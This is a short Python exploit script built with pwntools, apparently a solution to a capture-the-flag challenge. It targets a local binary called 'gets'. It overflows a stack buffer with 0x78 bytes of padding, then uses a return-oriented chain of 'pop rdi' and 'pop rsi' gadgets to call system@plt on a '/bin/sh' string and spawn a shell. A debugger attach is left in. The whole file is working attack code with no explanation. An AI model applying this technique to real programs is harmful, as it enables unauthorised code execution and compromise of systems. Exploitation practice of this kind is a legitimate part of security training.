from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
context.arch = 'amd64'

elf = ELF("./gets")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

sh = process("./gets")

prdi = 0x0000000000400753 #: pop rdi ; ret
prsi = 0x0000000000400751 #: pop rsi ; pop r15 ; ret

puts_plt = 0x400510
puts_got = 0x600B38
binsh = 0x600B70
system_plt = 0x400530
main = 0x4006BA

sh.recvuntil("input:\n")
payload = b'a'*0x78 + p64(prdi) + p64(binsh) + p64(prsi) + p64(0)*2+ p64(system_plt)
gdb.attach(sh)
sh.sendline(payload)

sh.interactive()
